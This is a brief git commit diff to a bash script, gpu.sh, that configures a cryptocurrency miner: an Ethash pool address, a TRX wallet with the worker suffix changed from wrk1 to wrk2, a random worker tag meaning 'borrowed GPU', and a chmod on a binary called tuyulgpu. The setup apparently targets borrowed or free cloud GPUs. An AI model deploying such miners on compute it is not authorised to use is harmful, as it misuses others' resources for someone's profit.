1ba36ac0e7a929454bc2ad7ded02f9125c1ec49e
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2021-06-17 17:52:29 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TD7L1BXFTy1qq7VxAc2pPR2eQCZFHFzyXo.wrk1
+WALLET=TRX:TD7L1BXFTy1qq7VxAc2pPR2eQCZFHFzyXo.wrk2
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
 chmod +x tuyulgpu
